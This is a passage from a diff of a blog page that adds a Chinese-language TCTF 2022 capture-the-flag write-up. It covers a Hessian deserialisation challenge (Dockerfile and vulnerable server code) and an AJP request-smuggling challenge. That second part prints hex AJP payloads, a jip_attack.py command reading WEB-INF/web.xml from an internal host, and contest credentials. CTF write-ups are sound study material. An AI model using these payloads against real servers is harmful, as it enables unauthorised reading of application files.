@@ -88,9 +88,9 @@
   <ul class="main-menu menu">
         <li class="menu-item menu-item-home"><a href="/" rel="section">Home</a></li>
         <li class="menu-item menu-item-about"><a href="/about/" rel="section">About</a></li>
-        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section">Tags<span class="badge">98</span></a></li>
-        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section">Categories<span class="badge">77</span></a></li>
-        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section">Archives<span class="badge">139</span></a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section">Tags<span class="badge">102</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section">Categories<span class="badge">79</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section">Archives<span class="badge">143</span></a></li>
       <li class="menu-item menu-item-search">
         <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
         </a>
@@ -161,18 +161,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">139</span>
+          <span class="site-state-item-count">143</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">77</span>
+        <span class="site-state-item-count">79</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">98</span>
+        <span class="site-state-item-count">102</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -218,6 +218,526 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/17/TCTF-2022/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpeg">
+      <meta itemprop="name" content="b1ue0cean">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="b1ue0cean's   blog">
+      <meta itemprop="description" content="我就是我，人间不一样的烟火">
+    </span>
+    
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | b1ue0cean's   blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/09/17/TCTF-2022/" class="post-title-link" itemprop="url">TCTF-2022</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-09-17 18:35:05" itemprop="dateCreated datePublished" datetime="2022-09-17T18:35:05+08:00">2022-09-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-09-19 03:12:04" itemprop="dateModified" datetime="2022-09-19T03:12:04+08:00">2022-09-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <span id="more"></span>
+
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="hessian-onlyJdk"><a href="#hessian-onlyJdk" class="headerlink" title="hessian-onlyJdk"></a>hessian-onlyJdk</h2><p>没见过 嗯写试试</p>
+<p>只能先看dockerfile理解一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://202.120.7.213:8090</span><br><span class="line">http://202.120.7.213:8091</span><br><span class="line">http://202.120.7.213:8092</span><br><span class="line">oversea</span><br><span class="line">http://47.90.137.5:8090</span><br><span class="line">hessian-onlyJdk.zip</span><br><span class="line">The server resets every 5 minutes</span><br><span class="line">reference 1 reference 2</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span>u342-slim</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> adduser ctf &amp;&amp; addgroup ctfgroup &amp;&amp; adduser ctf ctfgroup</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> /opt/app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> hessian-onlyJdk.jar /opt/app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> JavaUtils.class /opt/app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> jvmtiagent.so /opt/app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag /flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /opt/app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> ctf</span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;java&quot;</span>, <span class="string">&quot;-agentpath:/opt/app/jvmtiagent.so=/opt/app/JavaUtils.class&quot;</span>, <span class="string">&quot;-jar&quot;</span>, <span class="string">&quot;/opt/app/hessian-onlyJdk.jar&quot;</span>]</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-agentlib:<span class="symbol">&lt;libname&gt;</span>[=&lt;选项&gt;]</span><br><span class="line">              加载本机代理库 <span class="symbol">&lt;libname&gt;</span>, 例如 -agentli<span class="variable">b:hprof</span></span><br><span class="line">              另请参阅 -agentli<span class="variable">b:jdwp</span>=<span class="keyword">help</span> 和 -agentli<span class="variable">b:hprof</span>=<span class="keyword">help</span></span><br><span class="line">-agentpath:<span class="symbol">&lt;pathname&gt;</span>[=&lt;选项&gt;]</span><br><span class="line">              按完整路径名加载本机代理库</span><br><span class="line">-javaagent:<span class="symbol">&lt;jarpath&gt;</span>[=&lt;选项&gt;]</span><br><span class="line">              加载 Java 编程语言代理, 请参阅 java.lang.instrument</span><br></pre></td></tr></table></figure>
+
+<p>好像应该没啥用</p>
+<p>估计要rce</p>
+<p>来看一下这个入口文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.hessian.onlyJdk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpExchange;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpHandler;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpServer;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Index</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Index</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;server start&quot;</span>);</span><br><span class="line">        <span class="type">HttpServer</span> <span class="variable">server</span> <span class="operator">=</span> HttpServer.create(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">8090</span>), <span class="number">0</span>);</span><br><span class="line">        server.createContext(<span class="string">&quot;/&quot;</span>, <span class="keyword">new</span> <span class="title class_">MyHandler</span>());</span><br><span class="line">        server.setExecutor(Executors.newCachedThreadPool());</span><br><span class="line">        server.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MyHandler</span> <span class="keyword">implements</span> <span class="title class_">HttpHandler</span> &#123;</span><br><span class="line">        MyHandler() &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(HttpExchange t)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">response</span> <span class="operator">=</span> <span class="string">&quot;Welcome to 0CTF 2022!&quot;</span>;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> t.getRequestBody();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Hessian2Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(is);</span><br><span class="line">                input.readObject();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">                var5.printStackTrace();</span><br><span class="line">                response = <span class="string">&quot;oops! something is wrong&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            t.sendResponseHeaders(<span class="number">200</span>, (<span class="type">long</span>)response.length());</span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> t.getResponseBody();</span><br><span class="line">            os.write(response.getBytes());</span><br><span class="line">            os.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Where-are-you-from"><a href="#Where-are-you-from" class="headerlink" title="Where are you from?"></a>Where are you from?</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="number">202.120</span>.<span class="number">7.207</span> <span class="number">2333</span> Entry your team token to create a challenge container.</span><br><span class="line">Customer service staff : @llllIII||IIIllIl||IIIll||IIllll<span class="comment">#1086</span></span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//</span><span class="number">43.155</span>.<span class="number">107.208</span>:<span class="number">31015</span><span class="regexp">/ctf/</span></span><br><span class="line">u: r3kapig</span><br><span class="line">p: hof6YMxTY8AhORO5W42xp5aUOPBFuUhv</span><br><span class="line"></span><br><span class="line">    Welcome, r3kapig! Where are you from?</span><br><span class="line">    Server:     http:<span class="regexp">//</span><span class="number">43.155</span>.<span class="number">107.208</span>:<span class="number">31014</span><span class="regexp">/ctf/</span></span><br><span class="line">    Username:   r3kapig</span><br><span class="line">    Password:   U4vSQGuXOfUFPVFkadSYAlvQHFA0nwc2</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123400010</span><span class="keyword">a</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/17/TCTF-2022/image-20220918194053259.png" alt="image-20220918194053259"></p>
+<p>走私。</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1234018102020008485454502</span>f<span class="number">312e310000052</span>f<span class="number">617364660000093132372e302</span>e<span class="number">302e3100</span>ffff<span class="number">00093132372e302</span>e<span class="number">302e31000050000009</span>a<span class="number">006000</span>a<span class="number">6</span>b<span class="number">6565702</span>d<span class="number">616</span><span class="keyword">c</span><span class="number">69766500000</span>f<span class="number">4163636570742</span>d<span class="number">4</span><span class="keyword">c</span><span class="number">616e677561676500000</span>e<span class="number">656e2</span>d<span class="number">55532</span><span class="keyword">c</span><span class="number">656e3</span>b<span class="number">713</span>d<span class="number">302e3500</span>a<span class="number">00800013000000</span>f<span class="number">4163636570742</span>d<span class="number">456e636</span>f<span class="number">64696e67000013677</span>a<span class="number">69702</span><span class="keyword">c</span><span class="number">206465666</span><span class="keyword">c</span><span class="number">6174652</span><span class="keyword">c</span><span class="number">207364636800000</span>d<span class="number">43616368652</span>d<span class="number">436</span>f<span class="number">6e74726</span>f<span class="number">6</span><span class="keyword">c</span><span class="number">0000096</span>d<span class="number">61782</span>d<span class="number">6167653</span>d<span class="number">3000</span>a<span class="number">00e00074</span>d<span class="number">6</span>f<span class="number">7</span>a<span class="number">696</span><span class="keyword">c</span><span class="number">6</span><span class="keyword">c</span><span class="number">61000019557067726164652</span>d<span class="number">496e7365637572652</span>d<span class="number">52657175657374730000013100</span>a<span class="number">0010009746578742</span>f<span class="number">68746</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">00</span>a<span class="number">00</span>b<span class="number">00093132372e302</span>e<span class="number">302e31000</span>a<span class="number">00216</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e726571756573745</span>f<span class="number">7572690000012</span>f<span class="number">000</span>a<span class="number">001</span>f<span class="number">6</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e706174685</span>f<span class="number">696e666</span>f<span class="number">00000</span>f<span class="number">5745422</span>d<span class="number">494e462</span>f<span class="number">7765622e786</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">000</span>a<span class="number">00226</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e736572766</span><span class="keyword">c</span><span class="number">65745</span>f<span class="number">706174680000012</span>f<span class="number">00</span>ff</span><br></pre></td></tr></table></figure>
+
+<p>现在要把 所有的 <code>127.0.0.1</code> 替换成  内网地址 <code>3132372e302e302e31</code></p>
+<p>替换成内网的地址的hex <code>31302e3233332e302e3131</code></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1234018102020008485454502</span>f<span class="number">312e310000052</span>f<span class="number">6173646600000931302e3233332</span>e<span class="number">302e313100</span>ffff<span class="number">000931302e3233332</span>e<span class="number">302e3131000050000009</span>a<span class="number">006000</span>a<span class="number">6</span>b<span class="number">6565702</span>d<span class="number">616</span><span class="keyword">c</span><span class="number">69766500000</span>f<span class="number">4163636570742</span>d<span class="number">4</span><span class="keyword">c</span><span class="number">616e677561676500000</span>e<span class="number">656e2</span>d<span class="number">55532</span><span class="keyword">c</span><span class="number">656e3</span>b<span class="number">713</span>d<span class="number">302e3500</span>a<span class="number">00800013000000</span>f<span class="number">4163636570742</span>d<span class="number">456e636</span>f<span class="number">64696e67000013677</span>a<span class="number">69702</span><span class="keyword">c</span><span class="number">206465666</span><span class="keyword">c</span><span class="number">6174652</span><span class="keyword">c</span><span class="number">207364636800000</span>d<span class="number">43616368652</span>d<span class="number">436</span>f<span class="number">6e74726</span>f<span class="number">6</span><span class="keyword">c</span><span class="number">0000096</span>d<span class="number">61782</span>d<span class="number">6167653</span>d<span class="number">3000</span>a<span class="number">00e00074</span>d<span class="number">6</span>f<span class="number">7</span>a<span class="number">696</span><span class="keyword">c</span><span class="number">6</span><span class="keyword">c</span><span class="number">61000019557067726164652</span>d<span class="number">496e7365637572652</span>d<span class="number">52657175657374730000013100</span>a<span class="number">0010009746578742</span>f<span class="number">68746</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">00</span>a<span class="number">00</span>b<span class="number">000931302e3233332</span>e<span class="number">302e3131000</span>a<span class="number">00216</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e726571756573745</span>f<span class="number">7572690000012</span>f<span class="number">000</span>a<span class="number">001</span>f<span class="number">6</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e706174685</span>f<span class="number">696e666</span>f<span class="number">00000</span>f<span class="number">5745422</span>d<span class="number">494e462</span>f<span class="number">7765622e786</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">000</span>a<span class="number">00226</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e736572766</span><span class="keyword">c</span><span class="number">65745</span>f<span class="number">706174680000012</span>f<span class="number">00</span>ff</span><br></pre></td></tr></table></figure>
+
+<p>长度还没改。。。</p>
+<p>修改为正确长度 0187</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1234018702020008485454502</span>f<span class="number">312e310000052</span>f<span class="number">6173646600000931302e3233332</span>e<span class="number">302e313100</span>ffff<span class="number">000931302e3233332</span>e<span class="number">302e3131000050000009</span>a<span class="number">006000</span>a<span class="number">6</span>b<span class="number">6565702</span>d<span class="number">616</span><span class="keyword">c</span><span class="number">69766500000</span>f<span class="number">4163636570742</span>d<span class="number">4</span><span class="keyword">c</span><span class="number">616e677561676500000</span>e<span class="number">656e2</span>d<span class="number">55532</span><span class="keyword">c</span><span class="number">656e3</span>b<span class="number">713</span>d<span class="number">302e3500</span>a<span class="number">00800013000000</span>f<span class="number">4163636570742</span>d<span class="number">456e636</span>f<span class="number">64696e67000013677</span>a<span class="number">69702</span><span class="keyword">c</span><span class="number">206465666</span><span class="keyword">c</span><span class="number">6174652</span><span class="keyword">c</span><span class="number">207364636800000</span>d<span class="number">43616368652</span>d<span class="number">436</span>f<span class="number">6e74726</span>f<span class="number">6</span><span class="keyword">c</span><span class="number">0000096</span>d<span class="number">61782</span>d<span class="number">6167653</span>d<span class="number">3000</span>a<span class="number">00e00074</span>d<span class="number">6</span>f<span class="number">7</span>a<span class="number">696</span><span class="keyword">c</span><span class="number">6</span><span class="keyword">c</span><span class="number">61000019557067726164652</span>d<span class="number">496e7365637572652</span>d<span class="number">52657175657374730000013100</span>a<span class="number">0010009746578742</span>f<span class="number">68746</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">00</span>a<span class="number">00</span>b<span class="number">000931302e3233332</span>e<span class="number">302e3131000</span>a<span class="number">00216</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e726571756573745</span>f<span class="number">7572690000012</span>f<span class="number">000</span>a<span class="number">001</span>f<span class="number">6</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e706174685</span>f<span class="number">696e666</span>f<span class="number">00000</span>f<span class="number">5745422</span>d<span class="number">494e462</span>f<span class="number">7765622e786</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">000</span>a<span class="number">00226</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e736572766</span><span class="keyword">c</span><span class="number">65745</span>f<span class="number">706174680000012</span>f<span class="number">00</span>ff</span><br></pre></td></tr></table></figure>
+
+<p>先用content-length试一下</p>
+<p>31302e3233332e302e3131</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 jip_attack.py -p <span class="number">8009</span> -f WEB<span class="literal">-INF</span>/web.<span class="keyword">xml</span>  <span class="title">10</span>.<span class="number">233.0</span>.<span class="number">11</span></span><br></pre></td></tr></table></figure>
+
+<p>3132372e302e302e31</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1234018102020008485454502</span>f<span class="number">312e310000052</span>f<span class="number">617364660000093132372e302</span>e<span class="number">302e3100</span>ffff<span class="number">00093132372e302</span>e<span class="number">302e31000050000009</span>a<span class="number">006000</span>a<span class="number">6</span>b<span class="number">6565702</span>d<span class="number">616</span><span class="keyword">c</span><span class="number">69766500000</span>f<span class="number">4163636570742</span>d<span class="number">4</span><span class="keyword">c</span><span class="number">616e677561676500000</span>e<span class="number">656e2</span>d<span class="number">55532</span><span class="keyword">c</span><span class="number">656e3</span>b<span class="number">713</span>d<span class="number">302e3500</span>a<span class="number">00800013000000</span>f<span class="number">4163636570742</span>d<span class="number">456e636</span>f<span class="number">64696e67000013677</span>a<span class="number">69702</span><span class="keyword">c</span><span class="number">206465666</span><span class="keyword">c</span><span class="number">6174652</span><span class="keyword">c</span><span class="number">207364636800000</span>d<span class="number">43616368652</span>d<span class="number">436</span>f<span class="number">6e74726</span>f<span class="number">6</span><span class="keyword">c</span><span class="number">0000096</span>d<span class="number">61782</span>d<span class="number">6167653</span>d<span class="number">3000</span>a<span class="number">00e00074</span>d<span class="number">6</span>f<span class="number">7</span>a<span class="number">696</span><span class="keyword">c</span><span class="number">6</span><span class="keyword">c</span><span class="number">61000019557067726164652</span>d<span class="number">496e7365637572652</span>d<span class="number">52657175657374730000013100</span>a<span class="number">0010009746578742</span>f<span class="number">68746</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">00</span>a<span class="number">00</span>b<span class="number">00093132372e302</span>e<span class="number">302e31000</span>a<span class="number">00216</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e726571756573745</span>f<span class="number">7572690000012</span>f<span class="number">000</span>a<span class="number">001</span>f<span class="number">6</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e706174685</span>f<span class="number">696e666</span>f<span class="number">00000</span>f<span class="number">5745422</span>d<span class="number">494e462</span>f<span class="number">7765622e786</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">000</span>a<span class="number">00226</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e736572766</span><span class="keyword">c</span><span class="number">65745</span>f<span class="number">706174680000012</span>f<span class="number">00</span>ff</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0008485454502</span>f<span class="number">312e310000052</span>f<span class="number">6173646600000931302e3233332</span>e<span class="number">302e313100</span>ffff<span class="number">000931302e3233332</span>e<span class="number">302e3131000050000009</span>a<span class="number">006000</span>a<span class="number">6</span>b<span class="number">6565702</span>d<span class="number">616</span><span class="keyword">c</span><span class="number">69766500000</span>f<span class="number">4163636570742</span>d<span class="number">4</span><span class="keyword">c</span><span class="number">616e677561676500000</span>e<span class="number">656e2</span>d<span class="number">55532</span><span class="keyword">c</span><span class="number">656e3</span>b<span class="number">713</span>d<span class="number">302e3500</span>a<span class="number">00800013000000</span>f<span class="number">4163636570742</span>d<span class="number">456e636</span>f<span class="number">64696e67000013677</span>a<span class="number">69702</span><span class="keyword">c</span><span class="number">206465666</span><span class="keyword">c</span><span class="number">6174652</span><span class="keyword">c</span><span class="number">207364636800000</span>d<span class="number">43616368652</span>d<span class="number">436</span>f<span class="number">6e74726</span>f<span class="number">6</span><span class="keyword">c</span><span class="number">0000096</span>d<span class="number">61782</span>d<span class="number">6167653</span>d<span class="number">3000</span>a<span class="number">00e00074</span>d<span class="number">6</span>f<span class="number">7</span>a<span class="number">696</span><span class="keyword">c</span><span class="number">6</span><span class="keyword">c</span><span class="number">61000019557067726164652</span>d<span class="number">496e7365637572652</span>d<span class="number">52657175657374730000013100</span>a<span class="number">0010009746578742</span>f<span class="number">68746</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">00</span>a<span class="number">00</span>b<span class="number">000931302e3233332</span>e<span class="number">302e3131000</span>a<span class="number">00216</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e726571756573745</span>f<span class="number">7572690000012</span>f<span class="number">000</span>a<span class="number">001</span>f<span class="number">6</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e706174685</span>f<span class="number">696e666</span>f<span class="number">00000</span>f<span class="number">5745422</span>d<span class="number">494e462</span>f<span class="number">7765622e786</span>d<span class="number">6</span><span class="keyword">c</span><span class="number">000</span>a<span class="number">00226</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e736572766</span><span class="keyword">c</span><span class="number">65745</span>f<span class="number">706174680000012</span>f<span class="number">00</span>ff</span><br></pre></td></tr></table></figure>
+
+<p>3132372e302e302e31 换成 </p>
+<p>31302e3233332e302e3131</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0008485454502</span>f<span class="number">312e310000012</span>f<span class="number">0000093132372e302</span>e<span class="number">302e3100</span>ffff<span class="number">0001610000500000000</span>a<span class="number">00216</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e726571756573745</span>f<span class="number">7572690000012</span>f<span class="number">000</span>a<span class="number">00226</span>a<span class="number">617661782e736572766</span><span class="keyword">c</span><span class="number">65742e696</span>e<span class="number">636</span><span class="keyword">c</span><span class="number">7564652e736572766</span><span class="keyword">c</span><span class="number">65745</span>f<span class="number">706174680001532</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span class="number">2</span>f<span 